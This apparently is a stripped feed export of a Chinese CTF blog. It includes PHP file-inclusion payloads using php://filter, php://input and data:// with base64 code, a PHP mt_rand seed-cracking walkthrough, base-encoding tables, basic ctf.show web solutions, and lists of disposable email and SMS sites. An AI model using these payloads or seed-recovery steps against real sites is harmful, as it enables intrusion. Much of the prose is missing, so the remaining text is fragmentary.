title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p><br> <code>http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[]phpbase64</code><br> <br> <code>resource=&lt;&gt;</code> <br> <code>read=&lt;&gt;</code> |<br> <code>write=&lt;&gt;</code>|<br> <code>&lt;&gt;</code>  read&#x3D;  write&#x3D;  </p><h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><code>php://input</code>post<br> <br> <code>http://127.0.0.1/cmd.php?cmd=php://input</code><br> POST<code>&lt;?php phpinfo()?&gt;</code><br> <br> <code>enctype=&quot;multipart/form-data&quot;</code> php:&#x2F;&#x2F;input&#96; </p><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p>PHP&gt;&#x3D;5.2.0data:&#x2F;&#x2F;PHPbase64<br> <br> data:&#x2F;&#x2F;text&#x2F;plain<br> <code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code><br> <code>url=data://text/plain,&lt;?php print_r(glob(&quot;*&quot;)); ?&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/28/%E4%BC%98%E8%B4%A8%E5%9B%BE%E5%BA%8A/"/>
      <url>/2022/12/28/%E4%BC%98%E8%B4%A8%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p></p><p>1SM.MS<a href="https://sm.ms/">https://sm.ms</a></p><p>2imgbox<a href="https://imgbox.com/">https://imgbox.com</a></p><p>3Postimage<a href="https://postimages.org/">https://postimages.org</a></p><p>4imgurl<a href="https://imgurl.org/">https://imgurl.org</a></p><p>5<a href="https://imgchr.com/">https://imgchr.com</a></p><p>6Coding <a href="http://picbed.librejo.cn/">http://picbed.librejo.cn</a></p><p>7<a href="http://tuku.link/">http://tuku.link</a></p><p>8<a href="https://www.niupic.com/">https://www.niupic.com</a></p><p></p><p>1imgur<a href="https://imgur.com/">https://imgur.com</a></p><p>2<a href="https://www.superbed.cn/">https://www.superbed.cn</a></p><p>3hualigs<a href="https://www.hualigs.cn/">https://www.hualigs.cn</a></p><p>4Hello <a href="https://www.helloimg.com/">https://www.helloimg.com</a></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/28/%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1/"/>
      <url>/2022/12/28/%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><br><br><br></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://temp-mail.org/zh">https://temp-mail.org/zh</a></p><p><a href="https://www.mohmal.com/zh">https://www.mohmal.com/zh</a></p><p><a href="https://10minutemail.net/">https://10minutemail.net</a></p><p><a href="https://www.yinsiduanxin.com/mail.html">https://www.yinsiduanxin.com/mail.html</a></p><p><a href="https://bccto.me/">https://bccto.me</a></p><p><a href="https://www.guerrillamail.com/zh">https://www.guerrillamail.com/zh</a></p><p><a href="http://mailcatch.com/">http://mailcatch.com</a></p><p><a href="https://10minutemail.com/">https://10minutemail.com</a></p><p><a href="http://www.yopmail.com/zh">http://www.yopmail.com/zh</a></p><p><a href="https://9em.org/">https://9em.org</a></p><p><a href="http://0x5f3759df.cn/">http://0x5f3759df.cn</a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><br><br><br></p><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>1SMS Receive Free<a href="https://smsreceivefree.com/">https://smsreceivefree.com</a></p><p>2<a href="https://yunjiema.net/">https://yunjiema.net</a></p><p>3<a href="http://www.xnsms.com/">http://www.xnsms.com</a></p><p>4<a href="https://jiemahao.com/">https://jiemahao.com</a></p><p>5shejiinn<a href="https://www.shejiinn.com/">https://www.shejiinn.com</a></p><p>6mffac<a href="https://www.mffac.com/">https://www.mffac.com</a></p><p>7<a href="https://yunduanxin.net/">https://yunduanxin.net</a></p><p>8<a href="https://mianfeijiema.com/">https://mianfeijiema.com</a></p><p>9FreePhoneNum<a href="https://freephonenum.com/">https://freephonenum.com</a></p><p>10ZUSMS<a href="https://www.zusms.com/">https://www.zusms.com</a></p><p>11Free Online Phone<a href="https://www.freeonlinephone.org/">https://www.freeonlinephone.org</a></p><p>12receiveasms<a href="https://receiveasms.com/">https://receiveasms.com</a></p><p>13materialtools<a href="https://www.materialtools.com/">https://www.materialtools.com</a></p><p>14receivesmsonline<a href="https://www.receivesmsonline.net/">https://www.receivesmsonline.net</a></p><p>15Receive SMS Online<a href="http://receive-sms-online.com/">http://receive-sms-online.com</a></p><p>16MICSMS<a href="https://www.micsms.com/">https://www.micsms.com</a></p><p>17<a href="https://www.yinsiduanxin.com/">https://www.yinsiduanxin.com</a></p><p>18becmd<a href="https://www.becmd.com/">https://www.becmd.com</a></p><p>19z-sms<a href="http://www.z-sms.com/">http://www.z-sms.com</a></p><p>20<a href="https://www.suiyongsuiqi.com/">https://www.suiyongsuiqi.com</a></p><p>21we39<a href="https://www.we39.cn/">https://www.we39.cn</a></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto</title>
      <link href="/2022/12/19/Crypto%E4%B8%AD%E5%8F%AF%E8%83%BD%E7%94%A8%E7%9A%84%E5%AF%86%E7%A0%81/"/>
      <url>/2022/12/19/Crypto%E4%B8%AD%E5%8F%AF%E8%83%BD%E7%94%A8%E7%9A%84%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><h3 id="base100"><a href="#base100" class="headerlink" title="base100"></a>base100</h3><p><strong> Emoji </strong></p><table><thead><tr><th></th><th>base100</th></tr></thead><tbody><tr><td>flag</td><td></td></tr><tr><td>flag{gycfev123FGH_}</td><td></td></tr></tbody></table><h3 id="base92"><a href="#base92" class="headerlink" title="base92"></a>base92</h3><p><em>920-9a-zA-Z,!#$%&amp;()</em>+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~*<br><strong>base91 </strong></p><h3 id="base91"><a href="#base91" class="headerlink" title="base91"></a>base91</h3><p><strong>910-9a-zA-Z,!#$%&amp;()*+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{|}~ </strong></p><table><thead><tr><th></th><th>base91</th></tr></thead><tbody><tr><td>flag</td><td>@iH&lt;Z</td></tr><tr><td>flag{ASD231fgh_hj}</td><td>@iH&lt;,{cSBMB.9*gkg}Q2S}A</td></tr></tbody></table><h3 id="base85"><a href="#base85" class="headerlink" title="base85"></a>base85</h3><p><strong></strong></p><table><thead><tr><th></th><th>base85</th></tr></thead><tbody><tr><td>flag</td><td>Ao(mg</td></tr><tr><td>flag{}JK_gisyu</td><td>Ao(mgH[SLZ?Y&#x3D;(oH$</td></tr></tbody></table><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><strong>64(A-Z,a-z,0-9,+,&#x2F;)</strong></p><table><thead><tr><th></th><th>base64</th></tr></thead><tbody><tr><td>flag{asdfgs1sedfvfvdfd2345_}</td><td>ZmxhZ3thc2RmZ3Mxc2VkZnZmdmRmZDIzNDVffQ&#x3D;&#x3D;</td></tr><tr><td>flag{asdfgsdfd2345_}</td><td>ZmxhZ3thc2RmZ3NkZmQyMzQ1X30&#x3D;</td></tr><tr><td>flag</td><td>ZmxhZw&#x3D;&#x3D;</td></tr><tr><td>sdfdfc</td><td>c2RmZGZj</td></tr></tbody></table><h3 id="base62"><a href="#base62" class="headerlink" title="base62"></a>base62</h3><p><strong>620-9a-zA-Z</strong></p><h3 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h3><p><strong> Base58BitcoinBitcoinBase580OIl+&#x2F;</strong></p><table><thead><tr><th></th><th>base58</th></tr></thead><tbody><tr><td>flag</td><td>3cr9Ae</td></tr><tr><td>flag{4561230ASDO}</td><td>xpoetRNMzw3NmoorXfTgNTn</td></tr></tbody></table><h3 id="base36"><a href="#base36" class="headerlink" title="base36"></a>base36</h3><p><strong>360-9,a-z 360-9,A-Z</strong></p><table><thead><tr><th></th><th>base36</th></tr></thead><tbody><tr><td>123456</td><td>2n9c</td></tr><tr><td>10</td><td>a</td></tr><tr><td>9</td><td>9</td></tr><tr><td>11</td><td>b</td></tr></tbody></table><h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><p><strong>32A-Z,2-7)&#x3D;6</strong></p><table><thead><tr><th></th><th>base32</th></tr></thead><tbody><tr><td>flag</td><td>MZWGCZY&#x3D;</td></tr><tr><td>flag{123asd}</td><td>MZWGCZ33GEZDGYLTMR6Q&#x3D;&#x3D;&#x3D;&#x3D;</td></tr><tr><td>flag{123asd_sxvhgjh}</td><td>MZWGCZ33GEZDGYLTMRPXG6DWNBTWU2D5</td></tr></tbody></table><h3 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h3><p><strong>160-9,A-F</strong></p><table><thead><tr><th></th><th>base16</th></tr></thead><tbody><tr><td>flag</td><td>666C6167</td></tr><tr><td>flag{dujv_1236}</td><td>666C61677B64756A765F313233367D</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php</title>
      <link href="/2022/12/17/php%E4%B9%8B%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/"/>
      <url>/2022/12/17/php%E4%B9%8B%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><p><strong></strong>  <strong></strong></p><p><strong></strong></p><ul><li>true random number generators TRNGs</li><li>pseudo-random number generators PRNGs</li></ul><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h3><p>mt_rand()  Mersenne Twister </p><p><strong></strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mt_rand</span><span class="token punctuation">(</span>min<span class="token punctuation">,</span>max<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong></strong></p><p> min  maxmt_rand()  0  RAND_MAX </p><p> libc PHP  rand()  libc  mt_rand()  Mersenne Twister   libc  rand() </p><p><strong></strong></p><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">3150906288</span><span class="token number">513289678</span><span class="token number">35</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand()"></a>mt_srand()</h3><p>mt_srand()  Mersenne Twister </p><p><strong></strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mt_srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> seed seed </p><p><strong></strong><br> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">mktime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1132656473</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mt_srandseedmt_rand()</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">RAND_SEED</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">RAND_SEED</span><span class="token operator">*</span><span class="token number">123</span><span class="token operator">+</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">65536</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p><p>Random Seed</p><p></p><p> PHP 4.2.0  srand()  mt_srand() </p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>mt_rand()</p><p><strong> </strong></p><p><strong> mt_rand(): rand &#x3D; seed+(i*10)  seed  i  i  rand seed rand&#x3D;21 , i&#x3D;2  21&#x3D;seed+(2*10)  seed&#x3D;1 seed i  rand </strong></p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>mt_rand()seediseed</p><blockquote><p>Note:  PHP 4.2.0  srand()  mt_srand() </p></blockquote><p>mt_rand()seed</p><p>phpmt_rand()php_mt_srandphp cgimt_rand()</p><p><strong>php_mt_seed</strong></p><p> rand &#x3D; seed+(i<em>10)  mt_rand() *<em>php_mt_seed2^32seed</em></em> mt_rand()mt_rand(1,100)MIN MAX</p><p>mt_rand()key</p><p>C</p><p></p><h3 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h3><p><a href="http://www.openwall.com/php_mt_seed">http://www.openwall.com/php_mt_seed</a></p><p>mt_rand()mt_rand(1,100)MIN MAX</p><p></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kalimake  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>php_mt_seed<br> PHP</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$ php5 <span class="token operator">-</span>r <span class="token string single-quoted-string">'mt_srand(1234567890); echo mt_rand(),"\n";'</span><span class="token number">1328851649</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>cracker</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$ time <span class="token operator">.</span><span class="token operator">/</span>php_mt_seed <span class="token number">1328851649</span>   Pattern<span class="token punctuation">:</span> <span class="token constant">EXACT</span>   Version<span class="token punctuation">:</span> <span class="token number">3.0</span><span class="token number">.7</span> to <span class="token number">5.2</span><span class="token number">.0</span>   Found <span class="token number">0</span><span class="token punctuation">,</span> trying <span class="token number">0xfc000000</span> <span class="token operator">-</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> speed <span class="token number">16261.0</span> Mseeds<span class="token operator">/</span>s   Version<span class="token punctuation">:</span> <span class="token number">5.2</span><span class="token number">.1</span><span class="token operator">+</span>   Found <span class="token number">0</span><span class="token punctuation">,</span> trying <span class="token number">0x1e000000</span> <span class="token operator">-</span> <span class="token number">0x1fffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.8</span> Mseeds<span class="token operator">/</span>s   seed <span class="token operator">=</span> <span class="token number">0x1fd65f9a</span> <span class="token operator">=</span> <span class="token number">534142874</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">7.1</span><span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>   Found <span class="token number">1</span><span class="token punctuation">,</span> trying <span class="token number">0x26000000</span> <span class="token operator">-</span> <span class="token number">0x27ffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s   seed <span class="token operator">=</span> <span class="token number">0x273a3517</span> <span class="token operator">=</span> <span class="token number">658126103</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">5.2</span><span class="token number">.1</span> to <span class="token number">7.0</span><span class="token operator">.</span>x<span class="token punctuation">;</span> <span class="token constant">HHVM</span><span class="token punctuation">)</span>   Found <span class="token number">2</span><span class="token punctuation">,</span> trying <span class="token number">0x48000000</span> <span class="token operator">-</span> <span class="token number">0x49ffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s   seed <span class="token operator">=</span> <span class="token number">0x499602d2</span> <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">5.2</span><span class="token number">.1</span> to <span class="token number">7.0</span><span class="token operator">.</span>x<span class="token punctuation">;</span> <span class="token constant">HHVM</span><span class="token punctuation">)</span>   seed <span class="token operator">=</span> <span class="token number">0x499602d2</span> <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">7.1</span><span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>   Found <span class="token number">4</span><span class="token punctuation">,</span> trying <span class="token number">0xfe000000</span> <span class="token operator">-</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s   Found <span class="token number">4</span>     real    <span class="token number">0</span>m47<span class="token operator">.</span><span class="token number">028</span>s   user    <span class="token number">6</span>m15<span class="token operator">.</span><span class="token number">211</span>s   sys     <span class="token number">0</span>m0<span class="token operator">.</span><span class="token number">015</span>s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php_mt_seedPHP 3.0.75.2.0PHP 5.2.17.0.xPHP 7.1.0+</p><p><br> php_mt_seed 124 mt_rand()mt_rand(0,50)</p><p>mt_rand<br> 2mt_rand()<br> <strong>42mt_rand()2mt_rand()</strong></p><h1 id="-GWCTF-2019-"><a href="#-GWCTF-2019-" class="headerlink" title="[GWCTF 2019]"></a>[GWCTF 2019]</h1><p><br> <img src="https://img-blog.csdnimg.cn/20200712185058965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt=""><br> <code>utP4yKDDVV</code><br> F12 check.php<br> <img src="https://img-blog.csdnimg.cn/20200712185243498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt=""><br> check.php<br> <img src="https://img-blog.csdnimg.cn/20200712185326552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt=""><br> 0999999999mt_srand()<code>$str_long1</code>mt_rand()20<code>$str</code><code>$str</code><code>$str</code>flagPOST20flag10mt_srand<br> php_mt_seed</p><p>php_mt_seed</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">str1<span class="token operator">=</span><span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>str2<span class="token operator">=</span><span class="token string single-quoted-string">'utP4yKDDVV'</span>str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token operator">::</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># </span>length <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>res<span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span><span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token string single-quoted-string">'0'</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span> res<span class="token comment">// str(j)mt_rand()0str(len(str1)-1) mt_rand()061</span><span class="token number">12345678910111213</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200712192116451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt=""><br> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">20</span> <span class="token number">20</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">19</span> <span class="token number">19</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">51</span> <span class="token number">51</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">24</span> <span class="token number">24</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">46</span> <span class="token number">46</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><br> php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">.</span><span class="token operator">/</span>php_mt_seed <span class="token number">20</span> <span class="token number">20</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">19</span> <span class="token number">19</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">51</span> <span class="token number">51</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">24</span> <span class="token number">24</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">46</span> <span class="token number">46</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200712192456776.png" alt=""><br> 206396968</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">206396968</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200712192710912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt=""><br> flag<br> <img src="https://img-blog.csdnimg.cn/20200712192816550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt=""></p><p>**<a href="https://blog.csdn.net/qq_45521281">WHOAMIAnony</a> **</p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf show</title>
      <link href="/2022/12/11/ctf-show/"/>
      <url>/2022/12/11/ctf-show/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p></p><p><img src="https://img-blog.csdnimg.cn/596f9173f7ed4395b605372b2485798e.png#pic_center" alt="1"></p><p></p><p><img src="https://img-blog.csdnimg.cn/1f73d1abe28040d8b6694aac5d241642.png#pic_center" alt="2"></p><p>CTRL+U</p><p>robots.txtrobots.txt<a href="https://so.csdn.net/so/search?q=%E6%A0%B9%E7%9B%AE%E5%BD%95&spm=1001.2101.3001.7020"></a>&#x2F;robots.txt</p><p><img src="https://img-blog.csdnimg.cn/f67302ed82a940179b4af7082c8b1c2a.png#pic_center" alt="3"></p><p>&#x2F;flagishere.txtflag</p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p></p><p><img src="https://img-blog.csdnimg.cn/a501687594b2446a8c353d48ff9ac942.png#pic_center" alt="4"></p><p>phpsphpWebphp</p><p>repeaterphp</p><p><img src="https://img-blog.csdnimg.cn/b51eee7ec5e64148b8010a113ee635ae.png#pic_center" alt="6"></p><p><strong>index.php</strong></p><p><img src="https://img-blog.csdnimg.cn/82eb6e04e80f47699c17d354a8ab970d.png#pic_center" alt="5"></p><p>**&#x2F;index.phps**flag</p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p></p><p></p><p>w w w.zip</p><p><img 